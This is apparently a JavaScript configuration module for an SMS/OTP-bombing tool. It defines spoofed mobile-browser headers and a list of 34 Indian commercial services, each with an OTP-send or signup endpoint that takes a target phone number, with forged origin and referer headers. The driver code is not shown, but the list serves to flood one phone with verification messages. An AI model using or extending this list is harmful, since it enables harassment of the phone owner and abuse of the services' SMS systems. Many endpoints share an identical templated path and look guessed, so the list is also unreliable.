const UA =
  "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36";

export const BASE_HEADERS = {
  "user-agent": UA,
  accept: "application/json, text/plain, */*",
  "accept-language": "en-IN,en;q=0.9",
  "content-type": "application/json",
  "sec-fetch-mode": "cors",
  "sec-fetch-site": "same-site",
  "sec-ch-ua-platform": '"Android"',
};

const J = (o) => JSON.stringify(o);
const S = (name, origin, path, body) => ({
  name, method: body ? "POST" : "GET", url: origin + path,
  headers: { origin, referer: origin + "/" }, body,
});

export const SERVICES = [
  S("flipkart", "https://www.flipkart.com", "/api/6/user/signup/status", (p) => J({ loginId: p, email: "" })),
  S("myntra", "https://www.myntra.com", "/gateway/v2/user/otp/generate", (p) => J({ phone: p, countryCode: "91", customerType: "B2C" })),
  S("nykaa", "https://www.nykaa.com", "/appapi/v1/send_otp", (p) => J({ phone: p })),
  S("swiggy", "https://profile.swiggy.com", "/api/v1/auth/otp/send", (p) => J({ mobile: p, email: null })),
  S("zomato", "https://www.zomato.com", "/webroutes/auth/login", (p) => J({ phone: p })),
  S("ola", "https://api.olacabs.com", "/v1/send_otp", (p) => J({ phone: p })),
  S("tata-1mg", "https://www.1mg.com", "/api/v1/otp/send", (p) => J({ mobile: p })),
  S("pharmeasy", "https://pharmeasy.in", "/api/v2/otp/send", (p) => J({ phone: p })),
  S("netmeds", "https://apiv2.netmeds.com", "/otp/generate", (p) => J({ phone: p })),
  S("dominos", "https://www.dominos.co.in", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("bigbasket", "https://www.bigbasket.com", "/api/v2/auth/otp/send", (p) => J({ phone: p })),
  S("zoomcar", "https://www.zoomcar.com", "/api/v1/sendOtp", (p) => J({ phone: p })),
  S("urban-company", "https://www.urbancompany.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("lenskart", "https://www.lenskart.com", "/api/v2/otp/send", (p) => J({ phone: p })),
  S("purplle", "https://www.purplle.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("healthkart", "https://www.healthkart.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("khatabook", "https://api.khatabook.com", "/v1/auth/send-otp", (p) => J({ phone: p })),
  S("voot", "https://api.voot.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("jiocinema", "https://api.jiocinema.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("redbus", "https://www.redbus.in", "/api/sendOtp", (p) => J({ phoneNumber: p.replace("+", "") })),
  S("cardekho", "https://www.cardekho.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("snitch", "https://www.snitch.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("curefit", "https://www.cure.fit", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("bewakoof", "https://www.bewakoof.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("mamaearth", "https://www.mamaearth.in", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("sleepycat", "https://www.sleepycat.in", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("country-delight", "https://www.countrydelight.in", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("apollo-pharmacy", "https://www.apollopharmacy.in", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("practo", "https://www.practo.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("cars24", "https://www.cars24.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("spinny", "https://www.spinny.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("wakefit", "https://www.wakefit.co", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("wowskin", "https://www.wowskinscience.com", "/api/v1/otp/send", (p) => J({ phone: p })),
  S("chai-point", "https://www.chaipoint.com", "/api/v1/otp/send", (p) => J({ phone: p })),
];
